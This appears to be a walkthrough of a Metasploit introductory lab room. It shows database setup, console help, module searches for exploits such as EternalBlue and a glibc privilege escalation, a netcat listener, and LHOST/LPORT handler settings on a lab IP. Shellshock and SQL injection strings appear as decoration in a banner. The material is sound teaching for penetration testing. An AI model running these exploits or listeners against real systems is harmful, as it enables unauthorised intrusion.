---
Learn to use Metasploit, a tool to probe and exploit vulnerabilities on networks and servers.
---

![](https://i.imgur.com/98BESj9.png)


###  Intro

Metasploit, an open-source pentesting framework, is a powerful tool utilized by security engineers around the world. Maintained by Rapid 7, Metasploit is a collection of not only thoroughly tested exploits but also auxiliary and post-exploitation tools. Throughout this room, we will explore the basics of using this massive framework and a few of the modules it includes. 

  

-----------------------------------------

Here's a link to the companion video for this room in case you're stuck! [Link](https://youtu.be/DWd_jWvnKIQ)

  

The virtual machine used in this room (Ice), a worksheet version of this room, and the subsequent answer key can be downloaded for offline usage from [https://darkstar7471.com/resources.html](https://darkstar7471.com/resources.html)

Answer the questions below

Kali and most other security distributions of Linux include Metasploit by default. If you are using a different distribution of Linux, verify that you have it installed or install it from the Rapid 7 Github repository. 

 Completed

### Initializing...

If this is your first time using Metasploit, you'll have just a few things to do before you utilize its full functionality. Let's go ahead and get everything started!

![](https://www.rapid7.com/globalassets/rapid7-og.jpg)

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo msfdb init
[sudo] password for witty: 
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema

┌──(witty㉿kali)-[~/Downloads]
└─$ msfconsole -h
Usage: msfconsole [options]

Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --defer-module-loads         Defer module loading unless explicitly asked
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -l, --logger STRING              Specify a logger to use (TimestampColorlessFlatfile, Flatfile, StdoutWithoutTimestamps, Stdout, Stderr)
        --[no-]readline
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message


┌──(witty㉿kali)-[~/Downloads]
└─$ msfconsole -v
Framework Version: 6.2.26-dev

┌──(witty㉿kali)-[~/Downloads]
└─$ msfconsole -q
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.


```

First things first, we need to initialize the database! Let's do that now with the command: `msfdb init`  
_If you're using the AttackBox, you don't need to do this._

 Completed

Before starting Metasploit, we can view some of the advanced options we can trigger for starting the console. Check these out now by using the command: `msfconsole -h`  

 Completed

We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information? This will include the '**-**'

*-q*

Once the database is initialized, go ahead and start Metasploit via the command: `msfconsole`  

 Completed

After Metasploit has started, let's go ahead and check that we've connected to the database. Do this now with the command: `db_status`

These commands can also all be found in the 'Database Backend Commands' section of the msfconsole help menu (once you've started msf)

 Completed


Cool! We've connected to the database, which type of database does Metasploit 5 use?

This will be shown in the connection status command output. Also, MSF5 only supports one type of database so you can also find this within the documentation on Rapid7's website.

*postgresql*

### Rock 'em to the Core [Commands]

![](https://static.wixstatic.com/media/6a4a49_75ddb2fd16b3431c92c8a5865ef0b1dd~mv2.jpg)

Using the help menu, let's now learn the base commands and the module categories in Metasploit. Nearly all of the answers to the following questions can be found in the Metasploit help menu.  

Answer the questions below

```
msf6 > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    debug         Display information useful for debugging
    exit          Exit the console
    features      Display the list of not yet released features that can b
                  e opted in to
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sess
                  ions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    favorite      Add module(s) to the list of favorite modules
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module sta
                  ck
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific addres
                      s or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the databas
                      e
    db_import         Import a scan result file (filetype will be auto-det
                      ected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecate
                      d)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the defa
                      ult to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred edi
                  tor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths
    time          Time how long it takes to run a particular command


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24

msf6 > search
Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.


OPTIONS:

    -h, --help                      Help banner
    -I, --ignore                    Ignore the command if the only match has the same name as the search
    -o, --output <filename>         Send output to a file in csv format
    -r, --sort-descending <column>  Reverse the order of search results to descending order
    -S, --filter <filter>           Regex pattern used to filter search results
    -s, --sort-ascending <column>   Sort search results by the specified column in ascending order
    -u, --use                       Use module if there is one result

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r


msf6 > search aka:blue

Matching Modules
================

   #  Name                                            Disclosure Date  Rank     Check  Description
   -  ----                                            ---------------  ----     -----  -----------
   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep    2019-05-14       normal   Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   1  exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual   Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
   2  exploit/windows/smb/ms17_010_eternalblue        2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec             2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  auxiliary/admin/smb/ms17_010_command            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   5  auxiliary/scanner/smb/smb_ms17_010                               normal   No     MS17-010 SMB RCE Detection
   6  exploit/windows/local/cve_2020_0796_smbghost    2020-03-13       good     Yes    SMBv3 Compression Buffer Overflow
   7  exploit/windows/smb/cve_2020_0796_smbghost      2020-03-13       average  Yes    SMBv3 Compression Buffer Overflow


Interact with a module by name or index. For example info 7, use 7 or use exploit/windows/smb/cve_2020_0796_smbghost

msf6 > search date:2018-01-16

Matching Modules
================

   #  Name                                         Disclosure Date  Rank    Check  Description
   -  ----                                         ---------------  ----    -----  -----------
   0  exploit/linux/local/glibc_realpath_priv_esc  2018-01-16       normal  Yes    glibc 'realpath()' Privilege Escalation


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/glibc_realpath_priv_esc

msf6 > info 0

       Name: glibc 'realpath()' Privilege Escalation
     Module: exploit/linux/local/glibc_realpath_priv_esc
   Platform: Linux
       Arch: x86, x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2018-01-16

Provided by:
  halfdog
  bcoles <bcoles@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   Auto

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
  SESSION                   yes       The session to run this module on

Payload information:

Description:
  This module attempts to gain root privileges on Linux systems by 
  abusing a vulnerability in GNU C Library (glibc) version 2.26 and 
  prior. This module uses halfdog's RationalLove exploit to exploit a 
  buffer underflow in glibc realpath() and create a SUID root shell. 
  The exploit has offsets for glibc versions 2.23-0ubuntu9 and 
  2.24-11+deb9u1. The target system must have unprivileged user 
  namespaces enabled. This module has been tested successfully on 
  Ubuntu Linux 16.04.3 (x86_64) with glibc version 2.23-0ubuntu9; and 
  Debian 9.0 (x86_64) with glibc version 2.24-11+deb9u1.

References:
  http://www.securityfocus.com/bid/102525
  https://nvd.nist.gov/vuln/detail/CVE-2018-1000001
  https://www.exploit-db.com/exploits/43775
  https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
  http://www.openwall.com/lists/oss-security/2018/01/11/5
  https://securitytracker.com/id/1040162
  https://sourceware.org/bugzilla/show_bug.cgi?id=22679
  https://usn.ubuntu.com/3534-1/
  https://bugzilla.redhat.com/show_bug.cgi?id=1533836

Also known as:
  RationalLove.c


View the full module info with the info -d command.

┌──(witty㉿kali)-[~/D┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.8.19.103] 40911

msf6 > connect 10.8.19.103
Usage: connect [options] <host> <port>

Communicate with a host, similar to interacting via netcat, taking advantage of
any configured session pivoting.

OPTIONS:

    -c, --comm <comm>               Specify which Comm to use.
    -C, --crlf                      Try to use CRLF for EOL sequence.
    -h, --help                      Help banner.
    -i, --send-contents <file>      Send the contents of a file.
    -p, --proxies <proxies>         List of proxies to use.
    -P, --source-port <port>        Specify source port.
    -S, --source-address <address>  Specify source address.
    -s, --ssl                       Connect with SSL.
    -u, --udp                       Switch to a UDP socket.
    -w, --timeout <seconds>         Specify connect timeout.
    -z, --try-connection            Just try to connect, then return.

msf6 > connect -z 10.8.19.103 1337
[*] Connected to 10.8.19.103:1337 (via: 10.8.19.103:40911)

ASCII ART :)

msf6 > banner

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging 
with set HttpTrace true
Metasploit Documentation: https://docs.metasploit.com/

msf6 > banner
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to 
check out the result of hosts and services
Metasploit Documentation: https://docs.metasploit.com/

msf6 > banner
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params 
set LHOST eth0
Metasploit Documentation: https://docs.metasploit.com/

msf6 > banner
 ______________________________________
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command
Metasploit Documentation: https://docs.metasploit.com/

msf6 > banner

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command
Metasploit Documentation: https://docs.metasploit.com/

msf6 > banner
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the resource command to run 
commands from a file
Metasploit Documentation: https://docs.metasploit.com/

msf6 > banner
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command
Metasploit Documentation: https://docs.metasploit.com/

msf6 > banner

*Neutrino_Cannon*PrettyBeefy*PostalTime*binbash*deadastronauts*EvilBunnyWrote*L1T*Mail.ru*() { :;}; echo vulnerable*
*Team sorceror*ADACTF*BisonSquad*socialdistancing*LeukeTeamNaam*OWASP Moncton*Alegori*exit*Vampire Bunnies*APT593*
*QuePasaZombiesAndFriends*NetSecBG*coincoin*ShroomZ*Slow Coders*Scavenger Security*Bruh*NoTeamName*Terminal Cult*
*edspiner*BFG*MagentaHats*0x01DA*Kaczuszki*AlphaPwners*FILAHA*Raffaela*HackSurYvette*outout*HackSouth*Corax*yeeb0iz*
*SKUA*Cyber COBRA*flaghunters*0xCD*AI Generated*CSEC*p3nnm3d*IFS*CTF_Circle*InnotecLabs*baadf00d*BitSwitchers*0xnoobs*
*ItPwns - Intergalactic Team of PWNers*PCCsquared*fr334aks*runCMD*0x194*Kapital Krakens*ReadyPlayer1337*Team 443*
*H4CKSN0W*InfOUsec*CTF Community*DCZia*NiceWay*0xBlueSky*ME3*Tipi'Hack*Porg Pwn Platoon*Hackerty*hackstreetboys*
*ideaengine007*eggcellent*H4x*cw167*localhorst*Original Cyan Lonkero*Sad_Pandas*FalseFlag*OurHeartBleedsOrange*SBWASP*
*Cult of the Dead Turkey*doesthismatter*crayontheft*Cyber Mausoleum*scripterz*VetSec*norbot*Delta Squad Zero*Mukesh*
*x00-x00*BlackCat*ARESx*cxp*vaporsec*purplehax*RedTeam@MTU*UsalamaTeam*vitamink*RISC*forkbomb444*hownowbrowncow*
*etherknot*cheesebaguette*downgrade*FR!3ND5*badfirmware*Cut3Dr4g0n*dc615*nora*Polaris One*team*hail hydra*Takoyaki*
*Sudo Society*incognito-flash*TheScientists*Tea Party*Reapers of Pwnage*OldBoys*M0ul3Fr1t1B13r3*bearswithsaws*DC540*
*iMosuke*Infosec_zitro*CrackTheFlag*TheConquerors*Asur*4fun*Rogue-CTF*Cyber*TMHC*The_Pirhacks*btwIuseArch*MadDawgs*
*HInc*The Pighty Mangolins*CCSF_RamSec*x4n0n*x0rc3r3rs*emehacr*Ph4n70m_R34p3r*humziq*Preeminence*UMGC*ByteBrigade*
*TeamFastMark*Towson-Cyberkatz*meow*xrzhev*PA Hackers*Kuolema*Nakateam*L0g!c B0mb*NOVA-InfoSec*teamstyle*Panic*
*B0NG0R3*                                                                                    *Les Cadets Rouges*buf*
*Les Tontons Fl4gueurs*                                                                      *404 : Flag Not Found*
*' UNION SELECT 'password*      _________                __                                  *OCD247*Sparkle Pony* 
*burner_herz0g*                 \_   ___ \_____  _______/  |_ __ _________   ____            *Kill$hot*ConEmu*
*here_there_be_trolls*          /    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \           *;echo"hacked"*
*r4t5_*6rung4nd4*NYUSEC*        \     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/           *karamel4e*
*IkastenIO*TWC*balkansec*        \______  (____  /   __/|__| |____/ |__|    \___  >          *cybersecurity.li*
*TofuEelRoll*Trash Pandas*              \/     \/|__|                           \/           *OneManArmy*cyb3r_w1z4rd5*
*Astra*Got Schwartz?*tmux*                  ___________.__                                   *AreYouStuck*Mr.Robot.0*
*\nls*Juicy white peach*                    \__    ___/|  |__   ____                         *EPITA Rennes*
*HackerKnights*                               |    |   |  |  \_/ __ \                        *guildOfGengar*Titans*
*Pentest Rangers*                             |    |   |   Y  \  ___/                        *The Libbyrators*
*placeholder name*bitup*                      |____|   |___|  /\___  >                       *JeffTadashi*Mikeal*
*UCASers*onotch*                                            \/     \/                        *ky_dong_day_song*
*NeNiNuMmOk*                              ___________.__                                     *JustForFun!*
*Maux de tête*LalaNG*                     \_   _____/|  | _____     ____                     *g3tsh3Lls0on*
*crr0tz*z3r0p0rn*clueless*                 |    __)  |  | \__  \   / ___\                    *Phở Đặc Biệt*Paradox*
*HackWara*                                 |     \   |  |__/ __ \_/ /_/  >                   *KaRIPux*inf0sec*
*Kugelschreibertester*                     \___  /   |____(____  /\___  /                    *bluehens*Antoine77*
*icemasters*                                   \/              \//_____/                     *genxy*TRADE_NAMES*
*Spartan's Ravens*                       _______________   _______________                   *BadByte*fontwang_tw*
*g0ldd1gg3rs*pappo*                     \_____  \   _  \  \_____  \   _  \                   *ghoti*
*Les CRACKS*c0dingRabbits*               /  ____/  /_\  \  /  ____/  /_\  \                  *LinuxRiders*   
*2Cr4Sh*RecycleBin*                     /       \  \_/   \/       \  \_/   \                 *Jalan Durian*
*ExploitStudio*                         \_______ \_____  /\_______ \_____  /                 *WPICSC*logaritm*
*Car RamRod*0x41414141*                         \/     \/         \/     \/                  *Orv1ll3*team-fm4dd*
*Björkson*FlyingCircus*                                                                      *PwnHub*H4X0R*Yanee*
*Securifera*hot cocoa*                                                                       *Et3rnal*PelarianCP*
*n00bytes*DNC&G*guildzero*dorko*tv*42*{EHF}*CarpeDien*Flamin-Go*BarryWhite*XUcyber*FernetInjection*DCcurity*
*Mars Explorer*ozen_cfw*Fat Boys*Simpatico*nzdjb*Isec-U.O*The Pomorians*T35H*H@wk33*JetJ*OrangeStar*Team Corgi*
*D0g3*0itch*OffRes*LegionOfRinf*UniWA*wgucoo*Pr0ph3t*L0ner*_n00bz*OSINT Punchers*Tinfoil Hats*Hava*Team Neu*
*Cyb3rDoctor*Techlock Inc*kinakomochi*DubbelDopper*bubbasnmp*w*Gh0st$*tyl3rsec*LUCKY_CLOVERS*ev4d3rx10-team*ir4n6*
*PEQUI_ctf*HKLBGD*L3o*5 bits short of a byte*UCM*ByteForc3*Death_Geass*Stryk3r*WooT*Raise The Black*CTErr0r*
*Individual*mikejam*Flag Predator*klandes*_no_Skids*SQ.*CyberOWL*Ironhearts*Kizzle*gauti*
*San Antonio College Cyber Rangers*sam.ninja*Akerbeltz*cheeseroyale*Ephyra*sard city*OrderingChaos*Pickle_Ricks*
*Hex2Text*defiant*hefter*Flaggermeister*Oxford Brookes University*OD1E*noob_noob*Ferris Wheel*Ficus*ONO*jameless*
*Log1c_b0mb*dr4k0t4*0th3rs*dcua*cccchhhh6819*Manzara's Magpies*pwn4lyfe*Droogy*Shrubhound Gang*ssociety*HackJWU*
*asdfghjkl*n00bi3*i-cube warriors*WhateverThrone*Salvat0re*Chadsec*0x1337deadbeef*StarchThingIDK*Tieto_alaviiva_turva*
*InspiV*RPCA Cyber Club*kurage0verfl0w*lammm*pelicans_for_freedom*switchteam*tim*departedcomputerchairs*cool_runnings*
*chads*SecureShell*EetIetsHekken*CyberSquad*P&K*Trident*RedSeer*SOMA*EVM*BUckys_Angels*OrangeJuice*DemDirtyUserz*
*OpenToAll*Born2Hack*Bigglesworth*NIS*10Monkeys1Keyboard*TNGCrew*Cla55N0tF0und*exploits33kr*root_rulzz*InfosecIITG*
*superusers*H@rdT0R3m3b3r*operators*NULL*stuxCTF*mHackresciallo*Eclipse*Gingabeast*Hamad*Immortals*arasan*MouseTrap*
*damn_sadboi*tadaaa*null2root*HowestCSP*fezfezf*LordVader*Fl@g_Hunt3rs*bluenet*P@Ge2mE*



       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again
Metasploit Documentation: https://docs.metasploit.com/

msf6 > banner
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Start commands with a space to avoid saving 
them to history
Metasploit Documentation: https://docs.metasploit.com/

msf6 > set lhost 10.8.19.103
lhost => 10.8.19.103
msf6 > set lport 4444
lport => 4444

msf6 > setg LPORT 4444
LPORT => 4444
msf6 > setg LHOST 10.8.19.103
LHOST => 10.8.19.103

msf6 > get lhost
lhost => 10.8.19.103
msf6 > get lport
lport => 4444
msf6 > getg lport
lport => 4444
msf6 > getg lhost
lhost => 10.8.19.103

msf6 > unset lhost
Unsetting lhost...
msf6 > getg lhost
lhost => 
msf6 > unset lport
Unsetting lport...
